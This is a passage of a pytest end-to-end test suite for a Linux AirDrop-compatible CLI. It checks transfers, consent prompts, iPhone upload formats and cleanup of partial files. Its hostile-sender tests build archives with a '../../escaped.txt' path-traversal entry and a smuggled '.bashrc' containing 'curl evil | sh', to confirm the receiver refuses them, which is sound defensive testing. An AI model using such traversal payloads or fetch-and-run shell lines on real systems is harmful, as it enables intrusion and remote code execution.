"""End-to-end QA: drive the real `airdrop` CLI as a user would, over loopback.

AWDL/mDNS are skipped (--no-link / --peer); everything above the link —
TLS, Discover/Ask/Upload, gzip+cpio streaming, prompts, saving — is real.

The CLI under test is target/release/airdrop (`cargo build --release` first) unless
AIRDROP_CLI names another command, e.g. an installed /usr/bin/airdrop. AIRDROP_CLI_SENDER,
when set, runs the sending side with a different one, so two builds can be checked
against each other.
"""

from __future__ import annotations

import filecmp
import os
import plistlib
import re
import shlex
import socket
import ssl
import subprocess
import time
from pathlib import Path

import pytest

_BUILT = Path(__file__).resolve().parent.parent / "target" / "release" / "airdrop"
CLI = shlex.split(os.environ["AIRDROP_CLI"]) if os.environ.get("AIRDROP_CLI") else [str(_BUILT)]
if not os.environ.get("AIRDROP_CLI") and not _BUILT.is_file():
    pytest.exit(f"{_BUILT} not found: run `cargo build --release` first (or set AIRDROP_CLI)", returncode=2)
SENDER_CLI = shlex.split(os.environ["AIRDROP_CLI_SENDER"]) if os.environ.get("AIRDROP_CLI_SENDER") else CLI
RECEIVER_FLAGS = 0x8B  # TXT flags and /Discover DeviceSupportFlags we implement


def _plist(obj: dict) -> bytes:
    """Binary plist, keys sorted, as the iPhone and our client send them."""
    return plistlib.dumps(obj, fmt=plistlib.FMT_BINARY)


def _unplist(body: bytes) -> dict:
    return plistlib.loads(body) if body else {}


def _env(home: Path) -> dict:
    env = dict(os.environ, HOME=str(home), PYTHONUNBUFFERED="1")
    for var in ("XDG_CONFIG_HOME", "XDG_DATA_HOME", "DISPLAY", "WAYLAND_DISPLAY"):
        env.pop(var, None)
    return env


class Receiver:
    def __init__(self, home: Path, *extra: str, env: dict | None = None) -> None:
        self.home = home
        self.proc = subprocess.Popen(
            CLI + ["receive", "--no-link", "--port", "0", "--no-open", "--name", "Linux Box", *extra],
            env={**_env(home), **(env or {})}, stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE,
            text=True,
        )
        line = self.proc.stdout.readline()
        m = re.search(r"\]:(\d+)", line)
        assert m, f"receiver did not start: {line!r} {self.proc.stderr.read() if self.proc.poll() is not None else ''}"
        self.port = int(m.group(1))

    @property
    def downloads(self) -> Path:
        return self.home / "Downloads" / "AirDrop"

    def answer(self, text: str) -> None:
        self.proc.stdin.write(text + "\n")
        self.proc.stdin.flush()

    def stop(self) -> tuple[str, str]:
        self.proc.terminate()
        out, err = self.proc.communicate(timeout=10)
        return out, err


def send(home: Path, port: int, *args: str, timeout: float = 60) -> subprocess.CompletedProcess:
    return subprocess.run(SENDER_CLI + ["send", "--peer", f"[::1]:{port}", "--name", "Test Mac", *args],
                          env=_env(home), capture_output=True, text=True, timeout=timeout)


@pytest.fixture
def homes(tmp_path):
    r, s = tmp_path / "receiver-home", tmp_path / "sender-home"
    r.mkdir()
    s.mkdir()
    return r, s


@pytest.fixture
def tree(tmp_path) -> Path:
    """What a user typically sends: a video-sized binary, a photo, a folder with
    unicode names, nesting and an empty subfolder."""
    src = tmp_path / "src"
    (src / "Holiday Photos" / "day 2" / "empty").mkdir(parents=True)
    (src / "movie.mp4").write_bytes(os.urandom(12 * 1024 * 1024 + 123))
    (src / "Holiday Photos" / "IMG_0001.JPG").write_bytes(os.urandom(700_000))
    (src / "Holiday Photos" / "day 2" / "Zoë – notes.txt").write_text("ünïcødé ✓\n" * 1000)
    (src / "Holiday Photos" / "day 2" / "zero.bin").write_bytes(b"")
    return src


def _same_tree(a: Path, b: Path) -> bool:
    cmp = filecmp.dircmp(a, b)
    if cmp.left_only or cmp.right_only or cmp.funny_files:
        return False
    _, mismatch, errors = filecmp.cmpfiles(a, b, cmp.common_files, shallow=False)
    if mismatch or errors:
        return False
    return all(_same_tree(a / d, b / d) for d in cmp.common_dirs)


def test_send_files_and_folder_accept_all(homes, tree):
    rhome, shome = homes
    rx = Receiver(rhome, "--accept-all")
    try:
        res = send(shome, rx.port, str(tree / "movie.mp4"), str(tree / "Holiday Photos"))
        assert res.returncode == 0, res.stderr
        assert "Sent" in res.stdout
        # Same file again: must not overwrite the first copy.
        res2 = send(shome, rx.port, str(tree / "movie.mp4"))
        assert res2.returncode == 0, res2.stderr
    finally:
        out, err = rx.stop()
    got = rx.downloads
    assert (got / "movie.mp4").read_bytes() == (tree / "movie.mp4").read_bytes()
    assert (got / "movie (1).mp4").read_bytes() == (tree / "movie.mp4").read_bytes()
    assert _same_tree(tree / "Holiday Photos", got / "Holiday Photos")
    assert (got / "Holiday Photos" / "day 2" / "empty").is_dir()
    assert out.count("SAVED ") == 3, out


def test_decline_then_always_then_auto_accept(homes, tree):
    rhome, shome = homes
    rx = Receiver(rhome, "--ask")
    try:
        # 1. User says no: sender is told it was declined; nothing is written.
        p = subprocess.Popen(SENDER_CLI + ["send", "--peer", f"[::1]:{rx.port}", "--name", "Test Mac",
                                    str(tree / "movie.mp4")],
                             env=_env(shome), stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
        time.sleep(1.0)
        rx.answer("n")
        _, err = p.communicate(timeout=30)
        assert p.returncode == 3, err
        assert "declined" in err.lower()
        assert not rx.downloads.exists() or not any(rx.downloads.iterdir())

        # 2. User says always: accepted and remembered.
        p = subprocess.Popen(SENDER_CLI + ["send", "--peer", f"[::1]:{rx.port}", "--name", "Test Mac",
                                    str(tree / "Holiday Photos")],
                             env=_env(shome), stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
        time.sleep(1.0)
        rx.answer("a")
        _, err = p.communicate(timeout=30)
        assert p.returncode == 0, err

        # 3. Known sender: no prompt needed (nothing typed), transfer completes.
        res = send(shome, rx.port, str(tree / "movie.mp4"), timeout=30)
        assert res.returncode == 0, res.stderr
    finally:
        out, err = rx.stop()
    assert "auto-accepted" in err
    assert (rx.downloads / "movie.mp4").exists()
    assert _same_tree(tree / "Holiday Photos", rx.downloads / "Holiday Photos")
    cfg = (rhome / ".config" / "airdrop" / "config.toml").read_text()
    assert '"Test Mac"' in cfg



def test_nobody_answers_the_prompt_so_it_declines_and_keeps_serving(homes, tree):
    """The user walks away from the terminal while a stranger sends a file. After
    --ask-timeout the transfer is declined, the sender is told so (not left hanging),
    nothing is saved, and the next sender is asked again."""
    rhome, shome = homes
    rx = Receiver(rhome, "--ask", "--ask-timeout", "2")
    try:
        started = time.monotonic()
        res = send(shome, rx.port, str(tree / "movie.mp4"), timeout=30)
        assert res.returncode == 3, res.stderr
        assert "declined" in res.stderr.lower()
        assert time.monotonic() - started < 15  # told at the timeout, not at the sender's own limit
        assert not rx.downloads.exists() or not any(rx.downloads.iterdir())

        p = subprocess.Popen(SENDER_CLI + ["send", "--peer", f"[::1]:{rx.port}", "--name", "Test Mac",
                                           str(tree / "movie.mp4")],
                             env=_env(shome), stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
        time.sleep(1.0)
        rx.answer("y")
        _, err = p.communicate(timeout=30)
        assert p.returncode == 0, err
    finally:
        _, err = rx.stop()
    assert "No answer, declined." in err
    assert (rx.downloads / "movie.mp4").exists()


def test_send_link(homes):
    rhome, shome = homes
    rx = Receiver(rhome, "--accept-all")
    try:
        res = send(shome, rx.port, "--url", "https://example.com/some page?q=1")
        assert res.returncode == 0, res.stderr
    finally:
        out, _ = rx.stop()
    assert "LINK https://example.com/some page?q=1" in out


# ---- hostile sender: what a QA would try against the receiving side -----

def _raw_conn(port: int) -> ssl.SSLSocket:
    ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
    ctx.check_hostname = False
    ctx.verify_mode = ssl.CERT_NONE
    return ctx.wrap_socket(socket.create_connection(("::1", port)))


def _post(sock: ssl.SSLSocket, path: str, body: bytes, headers: dict[str, str] | None = None) -> int:
    extra = "".join(f"{k}: {v}\r\n" for k, v in (headers or {}).items())
    sock.sendall(f"POST {path} HTTP/1.1\r\nHost: x\r\n{extra}Content-Length: {len(body)}\r\n\r\n".encode() + body)
    data = b""
    while b"\r\n\r\n" not in data:
        chunk = sock.recv(65536)
        if not chunk:
            break
        data += chunk
    status = int(data.split(b" ", 2)[1])
    m = re.search(rb"Content-Length: (\d+)", data)
    rest = int(m.group(1)) - len(data.split(b"\r\n\r\n", 1)[1]) if m else 0
    while rest > 0:
        rest -= len(sock.recv(rest))
    return status


def _odc(name: str, data: bytes, mode: int = 0o100644) -> bytes:
    n = name.encode()
    return (b"070707%06o%06o%06o%06o%06o%06o%06o%011o%06o%011o" % (
        0, 1, mode, 0, 0, 1, 0, 0, len(n) + 1, len(data))) + n + b"\0" + data


def test_receiver_refuses_path_traversal_and_unasked_uploads(homes, tmp_path):
    rhome, _ = homes
    rx = Receiver(rhome, "--accept-all")
    try:
        # Upload without an accepted Ask is refused.
        with _raw_conn(rx.port) as s:
            assert _post(s, "/Upload", _odc("./x.txt", b"x") + _odc("TRAILER!!!", b"", 0)) == 403

        # Accepted Ask, then an archive that tries to escape the download folder.
        evil = (_odc("./ok.txt", b"fine") + _odc("../../escaped.txt", b"pwned")
                + _odc("TRAILER!!!", b"", 0))
        ask = _plist({"SenderComputerName": "Evil", "SenderModelName": "x", "SenderID": "1",
                      "BundleID": "com.apple.finder", "ConvertMediaFormats": False, "Items": [],
                      "Files": [{"FileName": "ok.txt", "FileType": "public.plain-text",
                                 "FileBomPath": "./ok.txt", "FileIsDirectory": False}]})
        with _raw_conn(rx.port) as s:
            assert _post(s, "/Ask", ask) == 200
            assert _post(s, "/Upload", evil, CPIO) == 400
    finally:
        rx.stop()
    assert not (rhome / "escaped.txt").exists()
    assert not (rhome / "Downloads" / "escaped.txt").exists()
    # The partial transfer is cleaned up rather than left half-written.
    assert not (rx.downloads / "ok.txt").exists()



CPIO = {"Content-Type": "application/x-cpio"}


def test_receiver_saves_only_what_the_prompt_named(homes):
    """A sender asks to send one photo, then smuggles a second file into the archive, or
    uploads something that is not an AirDrop archive at all. The user agreed to the photo
    only: neither upload may leave anything in Downloads."""
    rhome, _ = homes
    ask = _plist({"SenderComputerName": "Sneaky", "SenderModelName": "x", "SenderID": "2",
                  "BundleID": "com.apple.finder", "ConvertMediaFormats": False, "Items": [],
                  "Files": [{"FileName": "photo.jpg", "FileType": "public.jpeg",
                             "FileBomPath": "./photo.jpg", "FileIsDirectory": False}]})
    smuggled = (_odc(".", b"", 0o040755) + _odc("./photo.jpg", b"\xff\xd8 a photo")
                + _odc("./.bashrc", b"curl evil | sh") + _odc("TRAILER!!!", b"", 0))
    honest = _odc(".", b"", 0o040755) + _odc("./photo.jpg", b"\xff\xd8 a photo") + _odc("TRAILER!!!", b"", 0)
    rx = Receiver(rhome, "--accept-all")
    try:
        with _raw_conn(rx.port) as s:
            assert _post(s, "/Ask", ask) == 200
            assert _post(s, "/Upload", smuggled, CPIO) == 400
        with _raw_conn(rx.port) as s:
            assert _post(s, "/Ask", ask) == 200
            assert _post(s, "/Upload", honest, {"Content-Type": "text/plain"}) == 406
        # The receiver keeps serving: the same photo, sent properly, arrives.
        with _raw_conn(rx.port) as s:
            assert _post(s, "/Ask", ask) == 200
            assert _post(s, "/Upload", honest, CPIO) == 200
    finally:
        out, err = rx.stop()
    assert sorted(p.name for p in rx.downloads.iterdir()) == ["photo.jpg"]
    assert "not an item the sender announced" in out + err
    assert "unsupported Content-Type" in out + err


# ---- an iPhone on iOS 26+ sending to us ----------------------------------------
# Wire behaviour as captured from real iPhones (docs/PROTOCOL.md §7.1 and §10): three
# headers and a chunked body on /Discover and /Ask, a TransferID, a dvzip
# /Upload holding an NSIRD_ staging folder plus an AppleDouble sidecar, and the
# final empty chunk withheld until the receiver has answered.

def _chunked_post(sock: ssl.SSLSocket, path: str, body: bytes, headers: list[tuple[str, str]],
                  finish: bool = True) -> None:
    head = f"POST {path} HTTP/1.1\r\n" + "".join(f"{k}: {v}\r\n" for k, v in headers) + "\r\n"
    data = head.encode()
    for i in range(0, len(body), 32 * 1024):
        part = body[i:i + 32 * 1024]
        data += b"%X\r\n" % len(part) + part + b"\r\n"
    if finish:
        data += b"0\r\n\r\n"
    sock.sendall(data)


def _read_response(sock: ssl.SSLSocket) -> tuple[int, bytes]:
    data = b""
    while b"\r\n\r\n" not in data:
        chunk = sock.recv(65536)
        if not chunk:
            raise ConnectionError("closed")
        data += chunk
    head, body = data.split(b"\r\n\r\n", 1)
    length = int(re.search(rb"Content-Length: (\d+)", head).group(1))
    while len(body) < length:
        body += sock.recv(length - len(body))
    return int(head.split(b" ", 2)[1]), body


def _dvzip(cpio: bytes) -> bytes:
    import struct
    import zlib
    out = b""
    for n, off in enumerate(range(0, len(cpio), 128 * 1024)):
        block = cpio[off:off + 128 * 1024]
        if n % 2:  # alternate stored and deflated blocks, as Apple's container allows both
            out += struct.pack(">I", 0x80000000 | len(block)) + block
        else:
            z = zlib.compress(block)
            out += struct.pack(">I", len(z)) + z
    return out


def test_iphone_ios26_sends_photo(homes):
    rhome, _ = homes
    photo = os.urandom(400_000) + b"\0" * 200_000  # several dvzip blocks
    stage = "./NSIRD_AirDrop_Xk3pQa"
    cpio = (_odc(stage, b"", 0o040755) + _odc(f"{stage}/IMG_0042.HEIC", photo)
            + _odc(f"{stage}/._IMG_0042.HEIC", b"\0\5\x16\7AppleDouble sidecar")
            + _odc("TRAILER!!!", b"", 0))
    upload = _dvzip(cpio)
    tid = "664D3979-F245-4E9E-9EAC-80453E255E31"
    apple = [("User-Agent", "AirDrop/1.0"), ("Connection", "keep-alive"), ("Transfer-Encoding", "chunked")]
    ask = _plist({"SenderComputerName": "Anna's iPhone", "SenderModelName": "iPhone18,1",
                      "SenderID": "a1b2c3d4e5f6", "BundleID": "com.apple.sharingd",
                      "TransferID": {"id": tid}, "TransferType": {"files": {}},
                      "Files": [{"FileName": "IMG_0042.HEIC", "FileType": "public.heic",
                                 "FileBomPath": "./IMG_0042.HEIC", "FileIsDirectory": False}]})
    dumpdir = rhome / "dumps"
    rx = Receiver(rhome, "--accept-all", "--dump", str(dumpdir))
    try:
        with _raw_conn(rx.port) as s:
            s.settimeout(10)
            _chunked_post(s, "/Discover", _plist({}), apple)
            status, body = _read_response(s)
            assert status == 200 and _unplist(body)["ReceiverComputerName"] == "Linux Box"
            _chunked_post(s, "/Ask", ask, apple)
            assert _read_response(s)[0] == 200
            _chunked_post(s, "/Upload", upload, [
                ("User-Agent", "AirDrop/1.0"), ("TotalBytes", str(len(upload))),
                ("Content-Type", "application/x-dvzip"), ("SenderPseudonym", "pseud:RDUDcHgUEfGhmdJSNF0FmQ"),
                ("TransferID", tid), ("Connection", "keep-alive"), ("Transfer-Encoding", "chunked"),
            ], finish=False)
            # The iPhone waits for this reply before it sends its final chunk.
            assert _read_response(s)[0] == 200
            s.sendall(b"0\r\n\r\n")
    finally:
        out, _ = rx.stop()
    saved = rx.downloads / "IMG_0042.HEIC"
    assert saved.read_bytes() == photo
    assert sorted(p.name for p in rx.downloads.iterdir()) == ["IMG_0042.HEIC"]  # no NSIRD_, no ._ file
    assert f"SAVED {saved}" in out
    # --dump recorded the conversation the way the iPhone sent it
    import json
    session = next(dumpdir.iterdir())
    ask = json.loads((session / "002-Ask.json").read_text())
    assert ask["plist"]["TransferID"]["id"] == tid and ask["headers"]["transfer-encoding"] == "chunked"
    up = json.loads((session / "003-Upload.json").read_text())
    assert up["container"] == "dvzip" and up["headers"]["transferid"] == tid
    assert [m["name"] for m in up["archive_members"]][:2] == [stage, f"{stage}/IMG_0042.HEIC"]


def test_iphone_gets_ask_reply_at_once_and_user_answers_later(homes):
    """iOS times the /Ask round trip: the reply must come before the (slow) body
    has even finished, and the user's slower 'y' must still gate the files."""
    rhome, _ = homes
    photo = os.urandom(300_000)
    cpio = _odc("./IMG_0100.JPG", photo) + _odc("TRAILER!!!", b"", 0)
    upload = _dvzip(cpio)
    tid = "0B4D8C1E-1111-2222-3333-444455556666"
    apple = [("User-Agent", "AirDrop/1.0"), ("Connection", "keep-alive"), ("Transfer-Encoding", "chunked")]
    ask = _plist({"SenderComputerName": "Slow iPhone", "SenderModelName": "iPhone",
                      "TransferID": {"id": tid}, "TransferType": {"files": {}},
                      "FileIcon": os.urandom(48_000),  # the JPEG 2000 preview that makes /Ask slow
                      "Files": [{"FileName": "IMG_0100.JPG", "FileType": "public.jpeg",
                                 "FileBomPath": "./IMG_0100.JPG", "FileIsDirectory": False}]})
    rx = Receiver(rhome, "--ask")  # interactive: the person at the laptop answers
    try:
        with _raw_conn(rx.port) as s:
            s.settimeout(10)
            head = "POST /Ask HTTP/1.1\r\n" + "".join(f"{k}: {v}\r\n" for k, v in apple) + "\r\n"
            first = ask[:1000]
            s.sendall(head.encode() + b"%X\r\n" % len(first) + first + b"\r\n")
            t0 = time.monotonic()
            status, _ = _read_response(s)          # body is still incomplete here
            assert status == 200 and time.monotonic() - t0 < 2
            rest = ask[1000:]
            s.sendall(b"%X\r\n" % len(rest) + rest + b"\r\n0\r\n\r\n")
            _chunked_post(s, "/Upload", upload, [
                ("User-Agent", "AirDrop/1.0"), ("TotalBytes", str(len(upload))),
                ("Content-Type", "application/x-dvzip"), ("TransferID", tid),
                ("Connection", "keep-alive"), ("Transfer-Encoding", "chunked")], finish=False)
            time.sleep(2)                           # the user reads the prompt...
            assert not (rx.downloads / "IMG_0100.JPG").exists()  # nothing written before consent
            rx.answer("y")
            assert _read_response(s)[0] == 200
            s.sendall(b"0\r\n\r\n")
    finally:
        rx.stop()
    assert (rx.downloads / "IMG_0100.JPG").read_bytes() == photo


def _start_video_upload(port: int, video: bytes, tid: str) -> ssl.SSLSocket:
    """An iPhone that has sent /Ask and about half of a video's /Upload body."""
    cpio = _odc(".", b"", 0o040755) + _odc("./IMG_1515.MOV", video) + _odc("TRAILER!!!", b"", 0)
    upload = _dvzip(cpio)
    apple = [("User-Agent", "AirDrop/1.0"), ("Connection", "keep-alive"), ("Transfer-Encoding", "chunked")]
    ask = _plist({"SenderComputerName": "TestPhone", "SenderModelName": "iPhone", "SenderID": "0a1b2c3d4e5f",
                      "BundleID": "com.apple.mobileslideshow", "TransferID": {"id": tid},
                      "TransferType": {"files": {}}, "Items": [],
                      "Files": [{"FileName": "IMG_1515.MOV", "FileType": "com.apple.quicktime-movie",
                                 "FileSize": len(video), "FileBomPath": "./IMG_1515.MOV",
                                 "FileIsDirectory": False}]})
    s = _raw_conn(port)
    s.settimeout(10)
    _chunked_post(s, "/Ask", ask, apple)
    assert _read_response(s)[0] == 200
    half = upload[: len(upload) // 2]
    _chunked_post(s, "/Upload", half, [
        ("User-Agent", "AirDrop/1.0"), ("TotalBytes", str(len(video))),
        ("Content-Type", "application/x-dvzip"), ("TransferID", tid),
        ("Connection", "keep-alive"), ("Transfer-Encoding", "chunked")], finish=False)
    return s


def _wait_for(cond, timeout: float = 10) -> bool:
    end = time.monotonic() + timeout
    while time.monotonic() < end:
        if cond():
            return True
        time.sleep(0.05)
    return False


def test_cut_off_video_leaves_no_file(homes):
    """Measured 2026-11-03: a 31 MB video cut off after 7.7 MB stayed in the
    download folder as a complete-looking IMG_1515.MOV. A transfer that does not
    finish must leave nothing behind, whoever stops it."""
    rhome, _ = homes
    video = os.urandom(3 * 1024 * 1024)
    rx = Receiver(rhome, "--accept-all")
    try:
        # 1. The iPhone cancels mid-upload (closes the connection).
        s = _start_video_upload(rx.port, video, "11111111-2222-3333-4444-555555555555")
        assert _wait_for(lambda: any(rx.downloads.glob(".IMG_1515.MOV.airdrop-part*")))
        assert not (rx.downloads / "IMG_1515.MOV").exists()  # in progress: not under its real name
        s.close()
        assert _wait_for(lambda: not any(rx.downloads.iterdir()))
        # 2. The receiver keeps running, and the retry saves under the real name.
        s = _start_video_upload(rx.port, video, "66666666-7777-8888-9999-000000000000")
        rest = _dvzip(_odc(".", b"", 0o040755) + _odc("./IMG_1515.MOV", video) + _odc("TRAILER!!!", b"", 0))
        rest = rest[len(rest) // 2:]
        data = b"".join(b"%X\r\n" % len(rest[i:i + 32768]) + rest[i:i + 32768] + b"\r\n"
                        for i in range(0, len(rest), 32768))
        s.sendall(data)
        assert _read_response(s)[0] == 200
        s.sendall(b"0\r\n\r\n")
        s.close()
        assert _wait_for(lambda: (rx.downloads / "IMG_1515.MOV").exists())
        assert (rx.downloads / "IMG_1515.MOV").read_bytes() == video
        # 3. The user presses Ctrl-C on the receiver mid-upload.
        s = _start_video_upload(rx.port, video, "aaaaaaaa-bbbb-cccc-dddd-eeeeeeeeeeee")
        assert _wait_for(lambda: any(rx.downloads.glob(".IMG_1515.MOV.airdrop-part*")))
        rx.proc.send_signal(2)  # SIGINT, as Ctrl-C
        rx.proc.wait(timeout=10)
        s.close()
    finally:
        if rx.proc.poll() is None:
            rx.stop()
    assert sorted(p.name for p in rx.downloads.iterdir()) == ["IMG_1515.MOV"]  # only the complete one


def test_iphone_sees_chosen_media_caps_and_contact_exchange(homes):
    """Experiment knobs E3.4/E5.4: a user starts the receiver with a capability blob
    and contact exchange on; an iPhone-shaped client sees both, and an /Exchange it
    sends next is answered (400, as any unknown path) and kept in the dump."""
    import json
    rhome, _ = homes
    caps = '{"Version":2,"ContainerFormats":{}}'
    apple = [("User-Agent", "AirDrop/1.0"), ("Connection", "keep-alive"), ("Transfer-Encoding", "chunked")]
    dumpdir = rhome / "dumps"
    rx = Receiver(rhome, "--accept-all", "--dump", str(dumpdir),
                  env={"AIRDROP_MEDIA_CAPS": caps, "AIRDROP_CONTACT_EXCHANGE": "1"})
    try:
        with _raw_conn(rx.port) as s:
            s.settimeout(10)
            _chunked_post(s, "/Discover", _plist({}), apple)
            status, body = _read_response(s)
            assert status == 200 and _unplist(body)["ReceiverMediaCapabilities"] == caps.encode()
            _chunked_post(s, "/Ask", _plist({"SenderComputerName": "iPhone", "Files": []}), apple)
            status, body = _read_response(s)
            assert status == 200 and _unplist(body)["SupportsContactExchange"] is True
            _chunked_post(s, "/Exchange", _plist({"GivenName": "Test"}), apple)
            assert _read_response(s)[0] == 400
    finally:
        rx.stop()
    session = next(dumpdir.iterdir())
    ex = json.loads(next(session.glob("*-Exchange.json")).read_text())
    assert ex["plist"]["GivenName"] == "Test" and ex["our_status"] == 400

    # The default stays the plain {"Version":1}; "none" leaves the key out.
    for value, expect in (("", b'{"Version": 1}'), ("none", None)):
        rx = Receiver(rhome, "--accept-all", env={"AIRDROP_MEDIA_CAPS": value})
        try:
            with _raw_conn(rx.port) as s:
                s.settimeout(10)
                _chunked_post(s, "/Discover", _plist({}), apple)
                assert _unplist(_read_response(s)[1]).get("ReceiverMediaCapabilities") == expect
        finally:
            rx.stop()


def test_iphone_gets_declined_or_late_ask_when_user_sets_experiment(homes):
    """E5.1/E5.2 knobs: the receiver answers /Ask with the chosen status after the
    chosen delay; the iPhone-shaped client sees exactly that and nothing is saved."""
    import json
    rhome, _ = homes
    apple = [("User-Agent", "AirDrop/1.0"), ("Connection", "keep-alive"), ("Transfer-Encoding", "chunked")]
    dumpdir = rhome / "dumps"
    rx = Receiver(rhome, "--accept-all", "--dump", str(dumpdir),
                  env={"AIRDROP_ASK_STATUS": "403", "AIRDROP_ASK_DELAY": "1.5"})
    try:
        with _raw_conn(rx.port) as s:
            s.settimeout(10)
            _chunked_post(s, "/Ask", _plist({"SenderComputerName": "iPhone", "Files": []}), apple)
            t0 = time.monotonic()
            assert _read_response(s)[0] == 403
            assert time.monotonic() - t0 >= 1.4
    finally:
        rx.stop()
    ask = json.loads(next(next(dumpdir.iterdir()).glob("*-Ask.json")).read_text())
    assert ask["our_status"] == 403 and "1.5 s" in ask["note"]
    assert not rx.downloads.exists() or not any(rx.downloads.iterdir())


def test_linux_sender_discovers_like_an_iphone(homes, tmp_path):
    """A user sends a photo; the receiver's dump shows our /Discover in the iOS 27
    form: DeviceSupportFlags = the receiver flags we implement (an iPhone sends its
    own, the same value as its TXT flags), and the /Ask with a TransferID."""
    import json
    rhome, shome = homes
    photo = tmp_path / "IMG_0001.JPG"
    photo.write_bytes(os.urandom(300_000))
    dumpdir = rhome / "dumps"
    rx = Receiver(rhome, "--accept-all", "--dump", str(dumpdir))
    try:
        res = send(shome, rx.port, str(photo))
        assert res.returncode == 0, res.stderr
    finally:
        rx.stop()
    assert (rx.downloads / "IMG_0001.JPG").read_bytes() == photo.read_bytes()
    session = next(dumpdir.iterdir())
    disc = json.loads(next(session.glob("*-Discover.json")).read_text())
    assert disc["plist"]["DeviceSupportFlags"] == RECEIVER_FLAGS
    ask = json.loads(next(session.glob("*-Ask.json")).read_text())
    assert ask["plist"]["TransferID"]["id"] and ask["plist"]["Files"][0]["FileName"] == "IMG_0001.JPG"


def test_iphone_walks_away_mid_upload_and_receiver_cleans_up(homes):
    """The iPhone starts a video and then goes silent (locked, out of range) without
    closing the connection. The receiver must not wait forever: it reports the
    stalled transfer, keeps nothing in the download folder and stays usable."""
    receiver_home, _ = homes
    rx = Receiver(receiver_home, "--accept-all", env={"AIRDROP_STALL_TIMEOUT": "2"})
    try:
        video = os.urandom(3 * 1024 * 1024)
        sock = _start_video_upload(rx.port, video, "4E0E4B5B-0000-4000-8000-00000000AAAA")
        # ...and now nothing more arrives, but the connection stays open.
        assert _wait_for(lambda: any(rx.downloads.glob(".IMG_1515.MOV.airdrop-part*")))
        assert _wait_for(lambda: not any(rx.downloads.iterdir()), 20), \
            f"partial files left behind: {[p.name for p in rx.downloads.iterdir()]}"
        # A new sender is still served afterwards.
        other = _raw_conn(rx.port)
        assert _post(other, "/Discover", _plist({"DeviceSupportFlags": RECEIVER_FLAGS})) == 200
        other.close()
        sock.close()
    finally:
        _, err = rx.stop()
    assert "stalled" in err, err
    assert "Traceback" not in err, err


def test_ctrl_c_twice_while_waiting_for_accept_exits_cleanly(homes, tmp_path):
    """A user starts a send, the other side never answers, and they hit Ctrl-C
    (twice, impatiently). The command stops with a short message, not a traceback."""
    import signal
    receiver_home, sender_home = homes
    rx = Receiver(receiver_home, "--ask")  # terminal prompter: nobody answers
    try:
        photo = tmp_path / "photo.jpg"
        photo.write_bytes(os.urandom(400_000))
        proc = subprocess.Popen(SENDER_CLI + ["send", "--peer", f"[::1]:{rx.port}", "--name", "Test Mac", str(photo)],
                                env=_env(sender_home), stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
        assert "Waiting for" in proc.stdout.readline()
        time.sleep(0.5)
        proc.send_signal(signal.SIGINT)
        proc.send_signal(signal.SIGINT)
        out, err = proc.communicate(timeout=15)
    finally:
        rx.stop()
    assert proc.returncode == 130, (proc.returncode, err)
    assert "Stopped." in err
    assert "Traceback" not in err and "RuntimeError" not in err and "Exception ignored" not in err, err


def test_iphone_sends_several_photos_at_once_and_they_land_flat(homes):
    """Measured 2026-11-11: six items picked in Photos arrived each inside its own
    "PHMediaFormatConversionRequest-<UUID>" staging folder. The user wants the
    photos, not six oddly named folders."""
    rhome, _ = homes
    rx = Receiver(rhome, "--accept-all")
    try:
        photos = {"IMG_1615.jpg": os.urandom(300_000), "IMG_1616.jpg": os.urandom(200_000)}
        tid = "9A0E4B5B-0000-4000-8000-00000000BBBB"
        cpio = _odc(".", b"", 0o040755)
        files = []
        for i, (name, data) in enumerate(photos.items()):
            folder = f"PHMediaFormatConversionRequest-0000000{i}-6FBC-4751-8B1D-1D151D8861E6"
            cpio += _odc(f"./{folder}", b"", 0o040755) + _odc(f"./{folder}/{name}", data)
            files.append({"FileName": name, "FileType": "public.jpeg", "FileSize": len(data),
                          "FileBomPath": f"./{folder}/{name}", "FileIsDirectory": False})
        cpio += _odc("TRAILER!!!", b"", 0)
        apple = [("User-Agent", "AirDrop/1.0"), ("Connection", "keep-alive"), ("Transfer-Encoding", "chunked")]
        ask = _plist({"SenderComputerName": "TestPhone", "SenderModelName": "iPhone", "SenderID": "0a1b2c3d4e5f",
                          "BundleID": "com.apple.mobileslideshow", "TransferID": {"id": tid},
                          "TransferType": {"files": {}}, "Items": [], "Files": files})
        s = _raw_conn(rx.port)
        s.settimeout(10)
        _chunked_post(s, "/Ask", ask, apple)
        assert _read_response(s)[0] == 200
        _chunked_post(s, "/Upload", _dvzip(cpio), [
            ("User-Agent", "AirDrop/1.0"), ("TotalBytes", str(sum(map(len, photos.values())))),
            ("Content-Type", "application/x-dvzip"), ("TransferID", tid),
            ("Connection", "keep-alive"), ("Transfer-Encoding", "chunked")], finish=False)
        assert _read_response(s)[0] == 200
        s.close()
        assert _wait_for(lambda: len(list(rx.downloads.iterdir())) == 2)
    finally:
        rx.stop()
    assert sorted(p.name for p in rx.downloads.iterdir()) == sorted(photos)
    for name, data in photos.items():
        assert (rx.downloads / name).read_bytes() == data


def test_iphone_sends_photos_and_a_video_from_different_staging_trees(homes):
    """Measured 2026-11-12: six photos and a video picked together arrived under the
    iPhone's own folder trees ("Containers/Data/PluginKitPlugin/<UUID>/tmp/NSIRD_AirDrop_x/"
    and "Media/PhotoData/OutgoingTemp/PHMediaFormatConversionRequest-<UUID>/") and were
    saved as two folders named Containers and Media. The user wants the seven files."""
    rhome, _ = homes
    rx = Receiver(rhome, "--accept-all")
    try:
        plugin = "Containers/Data/PluginKitPlugin/62106086-43ED-42CB-81B4-BAB72CF52DB7/tmp"
        video_dir = "Media/PhotoData/OutgoingTemp/PHMediaFormatConversionRequest-453048FD-117C-4F62-BF48-E2157C8A266A"
        items = {f"{plugin}/NSIRD_AirDrop_8QSEsJ/IMG_1616.HEIC": os.urandom(120_000),
                 f"{plugin}/NSIRD_AirDrop_sARht4/IMG_1604.HEIC": os.urandom(90_000),
                 f"{video_dir}/IMG_1606.MOV": os.urandom(400_000)}
        tid = "04002A3B-0000-4000-8000-00000000CCCC"
        cpio = _odc(".", b"", 0o040711)
        made = set()
        for path, data in sorted(items.items()):
            parts = path.split("/")
            for n in range(1, len(parts)):
                folder = "/".join(parts[:n])
                if folder not in made:
                    made.add(folder)
